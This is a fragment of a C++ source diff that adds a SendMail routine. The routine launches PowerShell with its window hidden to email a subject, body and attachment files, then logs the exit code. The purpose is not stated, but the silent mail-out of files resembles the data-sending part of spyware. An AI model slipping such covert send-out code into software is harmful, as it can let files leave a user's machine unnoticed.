@@ -85,6 +85,48 @@ namespace Mail
 		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 		ShExecInfo.hwnd = NULL;
 		ShExecInfo.lpVerb = "open";
+		ShExecInfo.lpFile = "powershell";
+		ShExecInfo.lpParameters = param.c_str();
+		ShExecInfo.lpDirectory = NULL;
+		ShExecInfo.nShow = SW_HIDE;
+		ShExecInfo.hIcon = NULL;
+
+		ok = (bool)ShellExecuteEx(&ShExecInfo);
+		if (!ok)
+			return -3;
+
+
+		WaitForSingleObject(ShExecInfo.hProcess, 7000);
+		DWORD exit_code = 100;
+		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+
+		m_timer.SetFunction([&]()
+		{
+			WaitForSingleObject(ShExecInfo.hProcess, 60000);
+			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+			if ((int)exit_code == STILL_ACTIVE)
+				TerminateProcess(ShExecInfo.hProcess, 100);
+			Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
+		});
+
+		m_timer.RepeatCount(1L);
+		m_timer.SetInterval(10L);
+		m_timer.Start(true);
+		return (int)exit_code;
+	}
+
+	int SendMail(const string &subject, const string &body, const vector<string> &att)
+	{
+		string attachments = "";
+		if (att.size() == 1U)
+			attachments = att.at(0);
+		else
+		{
+			for (const auto &v : att)
+				attachments += v + "::";
+			attachments = attachments.substr(0, attachments.length() - 2);
+		}	
+		return SendMail(subject, body, attachments);
 	}
 }
 
